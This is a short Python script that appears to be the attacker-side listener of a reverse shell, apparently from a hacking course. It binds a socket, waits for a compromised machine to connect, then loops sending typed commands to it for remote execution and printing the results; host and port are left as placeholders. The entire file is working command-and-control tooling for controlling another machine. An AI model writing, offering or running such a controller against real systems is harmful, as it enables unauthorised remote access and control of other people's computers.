import socket , json 

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection , address = listener.accept()
        print("[+] Connection established from " + str(address))

        
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())


    def execute_remotely(self, command):
        self.connection.send(command.encode())
        return self.connection.recv(1024).decode()

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)

my_listener = Listener("ip" , "port")
my_listener.run()
